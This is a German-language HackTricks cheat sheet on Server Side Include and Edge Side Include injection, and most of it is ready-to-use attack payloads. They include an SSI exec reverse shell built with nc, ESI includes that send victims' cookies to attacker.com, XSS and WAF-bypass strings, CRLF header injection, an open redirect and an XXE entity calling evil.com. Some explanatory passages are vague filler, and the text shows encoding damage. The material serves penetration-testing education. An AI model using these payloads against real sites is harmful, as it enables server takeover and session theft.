# Server Side Inclusion/Edge Side Inclusion Injection

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>

## Grundlegende Informationen zur Server Side Inclusion

**(Einf√ºhrung aus [Apache-Dokumentation](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) sind Anweisungen, die in HTML-Seiten platziert werden und auf dem Server ausgewertet werden, w√§hrend die Seiten bereitgestellt werden. Sie erm√∂glichen es Ihnen, dynamisch generierten Inhalt zu einer vorhandenen HTML-Seite hinzuzuf√ºgen, ohne die gesamte Seite √ºber ein CGI-Programm oder eine andere dynamische Technologie bereitzustellen.\
Zum Beispiel k√∂nnten Sie eine Anweisung in eine vorhandene HTML-Seite einf√ºgen, wie:

`<!--#echo var="DATE_LOCAL" -->`

Und wenn die Seite bereitgestellt wird, wird dieses Fragment ausgewertet und durch seinen Wert ersetzt:

`Dienstag, 15-Jan-2013 19:28:54 EST`

Die Entscheidung, wann SSI verwendet werden soll und wann Ihre Seite vollst√§ndig von einem Programm generiert werden soll, h√§ngt normalerweise davon ab, wie viel von der Seite statisch ist und wie viel bei jedem Aufruf der Seite neu berechnet werden muss. SSI ist eine gro√üartige M√∂glichkeit, kleine Informationsst√ºcke hinzuzuf√ºgen, wie z.B. die aktuelle Uhrzeit - wie oben gezeigt. Wenn jedoch der Gro√üteil Ihrer Seite zum Zeitpunkt der Bereitstellung generiert wird, m√ºssen Sie nach einer anderen L√∂sung suchen.

Sie k√∂nnen das Vorhandensein von SSI ableiten, wenn die Webanwendung Dateien mit den Erweiterungen \*\* `.shtml`, `.shtm` oder `.stm`\*\* verwendet, aber das ist nicht immer der Fall.

Ein typischer SSI-Ausdruck hat das folgende Format:
```
<!--#directive param="value" -->
```
### √úberpr√ºfung

Um zu √ºberpr√ºfen, ob eine Webseite anf√§llig f√ºr Server Side Inclusion (SSI) oder Edge Side Inclusion (ESI) Injection ist, k√∂nnen Sie die folgenden Schritte ausf√ºhren:

1. **Quellcodeanalyse**: √úberpr√ºfen Sie den Quellcode der Webseite auf Anzeichen von SSI- oder ESI-Injektion. Suchen Sie nach Funktionen oder Methoden, die externe Inhalte einbinden oder dynamische Inhalte generieren.

2. **Parameter√ºberpr√ºfung**: Identifizieren Sie alle Benutzereingaben, die in die Webseite eingef√ºgt werden. √úberpr√ºfen Sie, ob diese Eingaben ordnungsgem√§√ü validiert und bereinigt werden, um potenzielle Injektionen zu verhindern.

3. **Testen der Injektion**: Versuchen Sie, speziell gestaltete Eingaben einzuf√ºgen, um zu sehen, ob die Webseite anf√§llig f√ºr SSI- oder ESI-Injektion ist. Verwenden Sie verschiedene Techniken wie Nullbytes, Kommentare oder spezielle Zeichen, um die Injektion zu testen.

4. **Beobachten der Ausgabe**: √úberpr√ºfen Sie die Ausgabe der Webseite, um festzustellen, ob die injizierten Inhalte korrekt gerendert werden. Wenn Sie sehen, dass externe Inhalte oder dynamische Inhalte in die Webseite eingef√ºgt werden, besteht m√∂glicherweise eine Injektionsm√∂glichkeit.

5. **Exploit-Entwicklung**: Wenn Sie eine erfolgreiche Injektion gefunden haben, entwickeln Sie einen Exploit, um die Kontrolle √ºber die Webseite zu erlangen oder Informationen zu extrahieren. Verwenden Sie geeignete Techniken wie Remote Code Execution (RCE) oder Directory Traversal, um das gew√ºnschte Ergebnis zu erzielen.

Es ist wichtig zu beachten, dass das Ausnutzen von SSI- oder ESI-Injektionen ohne vorherige Zustimmung des Eigent√ºmers der Webseite illegal ist. F√ºhren Sie diese √úberpr√ºfungen nur auf autorisierten Systemen durch und halten Sie sich an die geltenden Gesetze und Vorschriften.
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

Es gibt ein Problem beim **Cachen von Informationen oder dynamischen Anwendungen**, da sich der Inhalt beim n√§chsten Abrufen m√∂glicherweise **ver√§ndert** hat. Hier kommt ESI ins Spiel, um mit ESI-Tags den **dynamischen Inhalt zu kennzeichnen, der vor dem Senden der Cache-Version generiert werden muss**. Wenn ein **Angreifer** in der Lage ist, ein ESI-Tag in den Cache-Inhalt einzuf√ºgen, kann er beliebigen Inhalt in das Dokument einschleusen, bevor es an die Benutzer gesendet wird.

### ESI-Erkennung

Der folgende **Header** in einer Antwort vom Server bedeutet, dass der Server ESI verwendet:
```
Surrogate-Control: content="ESI/1.0"
```
Wenn Sie diesen Header nicht finden k√∂nnen, verwendet der Server m√∂glicherweise trotzdem ESI.\
Es kann auch ein blinder Ausbeutungsansatz verwendet werden, da eine Anfrage an den Server des Angreifers gesendet werden sollte:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI-Ausnutzung

[GoSecure hat](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) eine Tabelle erstellt, um m√∂gliche Angriffe zu verstehen, die wir gegen verschiedene ESI-f√§hige Software ausprobieren k√∂nnen, abh√§ngig von der unterst√ºtzten Funktionalit√§t:

* **Includes**: Unterst√ºtzt die `<esi:includes>`-Anweisung
* **Vars**: Unterst√ºtzt die `<esi:vars>`-Anweisung. N√ºtzlich zum Umgehen von XSS-Filtern
* **Cookie**: Dokument-Cookies sind f√ºr den ESI-Engine zug√§nglich
* **Upstream-Header erforderlich**: Surrogat-Anwendungen verarbeiten ESI-Anweisungen nur, wenn die Upstream-Anwendung die Header bereitstellt
* **Host-Whitelist**: In diesem Fall sind ESI-Includes nur von zugelassenen Serverhosts m√∂glich, sodass beispielsweise SSRF nur gegen diese Hosts m√∂glich ist

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream-Header erforderlich** | **Host-Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |     Ja     |    Ja   |     Ja     |              Ja              |         Nein         |
|         Varnish Cache        |     Ja     |    Nein    |      Nein     |              Ja              |         Ja        |
|            Fastly            |     Ja     |    Nein    |      Nein     |               Nein              |         Ja        |
| Akamai ESI Test Server (ETS) |     Ja     |    Ja   |     Ja     |               Nein              |         Nein         |
|          NodeJS esi          |     Ja     |    Ja   |     Ja     |               Nein              |         Nein         |
|         NodeJS nodesi        |     Ja     |    Nein    |      Nein     |               Nein              |      Optional      |

#### XSS

Die folgende ESI-Anweisung l√§dt eine beliebige Datei in die Antwort des Servers.
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Umgehung des XSS-Schutzes auf Clientseite

Eine M√∂glichkeit, den XSS-Schutz auf Clientseite zu umgehen, besteht darin, spezielle Techniken zu verwenden, um sch√§dlichen Code einzuf√ºgen, der normalerweise vom XSS-Filter blockiert w√ºrde. Hier sind einige g√§ngige Methoden, um den Client XSS-Schutz zu umgehen:

1. **HTML-Entit√§ten**: Durch die Verwendung von HTML-Entit√§ten k√∂nnen Sie Sonderzeichen in harmlose Zeichen umwandeln, die vom XSS-Filter nicht erkannt werden. Zum Beispiel kann das Zeichen `<` durch `&lt;` ersetzt werden.

2. **JavaScript Escape-Sequenzen**: Durch die Verwendung von JavaScript Escape-Sequenzen k√∂nnen Sie Sonderzeichen in harmlose Zeichen umwandeln. Zum Beispiel kann das Zeichen `<` durch `\x3c` ersetzt werden.

3. **DOM-basierte XSS**: Anstatt sch√§dlichen Code direkt in den HTML-Code einzuf√ºgen, k√∂nnen Sie JavaScript verwenden, um den DOM (Document Object Model) zu manipulieren und sch√§dlichen Code einzuf√ºgen.

4. **Polyglot-Payloads**: Polyglot-Payloads sind speziell entwickelte Payloads, die sowohl als JavaScript- als auch als HTML-Code interpretiert werden k√∂nnen. Durch die Verwendung solcher Payloads k√∂nnen Sie den XSS-Filter umgehen.

Es ist wichtig zu beachten, dass das Umgehen des XSS-Schutzes auf Clientseite eine ethisch fragw√ºrdige Handlung ist und nur zu Schulungszwecken oder mit ausdr√ºcklicher Zustimmung des Eigent√ºmers des Systems durchgef√ºhrt werden sollte.
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Cookie stehlen

* Ferngesteuertes Stehlen von Cookies
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Stiehle das HTTP\_ONLY-Cookie mit XSS, indem du es in der Antwort reflektierst:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Private lokale Datei

Verwechseln Sie dies nicht mit einer "Lokalen Dateieinbindung":
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF steht f√ºr Carriage Return Line Feed und bezieht sich auf die Zeichenfolge "\r\n". Es handelt sich um eine Kombination aus einem Wagenr√ºcklauf (CR) und einem Zeilenumbruch (LF). In einigen Betriebssystemen wird CRLF verwendet, um den Zeilenumbruch in Textdateien zu kennzeichnen.

CRLF-Injektion tritt auf, wenn ein Angreifer die CRLF-Sequenz in eine Anwendung einschleust, um unerw√ºnschte Auswirkungen zu erzielen. Dies kann dazu f√ºhren, dass der Angreifer HTTP-Header manipuliert, um beispielsweise Cross-Site Scripting (XSS) oder HTTP Response Splitting-Angriffe durchzuf√ºhren.

Ein Beispiel f√ºr eine CRLF-Injektion ist das Einf√ºgen von "%0D%0A" in eine URL, um einen Zeilenumbruch in den HTTP-Header einzuf√ºgen. Dadurch kann der Angreifer den Header manipulieren und b√∂sartigen Code einschleusen.

Um CRLF-Injektionen zu verhindern, sollten Eingaben validiert und bereinigt werden, bevor sie in HTTP-Header oder andere Ausgabekan√§le eingef√ºgt werden. Es ist auch wichtig, sicherzustellen, dass die Anwendung keine unsicheren Zeichenfolgen akzeptiert, die CRLF-Sequenzen enthalten k√∂nnten.

Die CRLF-Injektion ist eine weit verbreitete Sicherheitsl√ºcke, die von Angreifern ausgenutzt werden kann, um verschiedene Arten von Angriffen durchzuf√ºhren. Es ist wichtig, sich dieser Schwachstelle bewusst zu sein und geeignete Ma√ünahmen zu ergreifen, um sie zu verhindern.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Offene Weiterleitung

Das Folgende f√ºgt einen `Location`-Header zur Antwort hinzu.
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Header hinzuf√ºgen

* F√ºgen Sie einen Header in den erzwungenen Request hinzu
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* F√ºge einen Header in der Antwort hinzu (n√ºtzlich, um "Content-Type: text/json" in einer Antwort mit XSS zu umgehen)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF in Header hinzuf√ºgen (**CVE-2019-2438)**

Eine CRLF-Injektion (Carriage Return Line Feed) tritt auf, wenn ein Angreifer in der Lage ist, Steuerzeichen wie Zeilenumbr√ºche in HTTP-Headern einzuf√ºgen. Dies kann zu verschiedenen Angriffen f√ºhren, einschlie√ülich HTTP Response Splitting und Cross-Site Scripting (XSS).

Die CVE-2019-2438 ist eine Sicherheitsl√ºcke, die es einem Angreifer erm√∂glicht, CRLF-Injektionen zu nutzen, um sch√§dlichen Code einzuf√ºgen oder HTTP-Header zu manipulieren. Dies kann zu einer Vielzahl von Angriffen f√ºhren, einschlie√ülich der Umleitung von Benutzern auf b√∂sartige Websites oder dem Diebstahl von Sitzungscookies.

Um diese Sicherheitsl√ºcke zu beheben, sollten Entwickler sicherstellen, dass alle Benutzereingaben ordnungsgem√§√ü validiert und bereinigt werden, bevor sie in HTTP-Headern verwendet werden. Es ist auch wichtig, die neuesten Sicherheitsupdates und Patches f√ºr die verwendete Software zu installieren, um bekannte Schwachstellen zu beheben.

Es ist ratsam, regelm√§√üig Sicherheitsaudits durchzuf√ºhren, um potenzielle CRLF-Injektionen und andere Sicherheitsl√ºcken zu identifizieren und zu beheben. Durch eine proaktive Herangehensweise an die Sicherheit k√∂nnen Entwickler und Unternehmen ihre Systeme vor Angriffen sch√ºtzen und die Vertraulichkeit und Integrit√§t ihrer Daten gew√§hrleisten.
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai Debug

Dies sendet Debug-Informationen, die in der Antwort enthalten sind:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Durch die Angabe des `xslt`-Werts f√ºr den _dca_-Parameter ist es m√∂glich, **`eXtensible Stylesheet Language Transformations (XSLT)`** basierte ESI einzuschlie√üen. Die Inklusion f√ºhrt dazu, dass der HTTP-Surrogat die XML- und XSLT-Dateien abruft, wobei letztere die ersteren filtern. Solche XML-Dateien sind anf√§llig f√ºr _XML External Entity (XXE)_-Angriffe, die es Angreifern erm√∂glichen, SSRF-Angriffe auszuf√ºhren. Die N√ºtzlichkeit dieses Ansatzes ist jedoch begrenzt, da ESI bereits als SSRF-Vektor dient. Aufgrund des fehlenden Supports in der zugrunde liegenden Xalan-Bibliothek werden externe DTDs nicht verarbeitet, was die Extraktion lokaler Dateien verhindert.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT-Datei:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
√úberpr√ºfen Sie die XSLT-Seite:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Referenzen

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force-Erkennungsliste

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
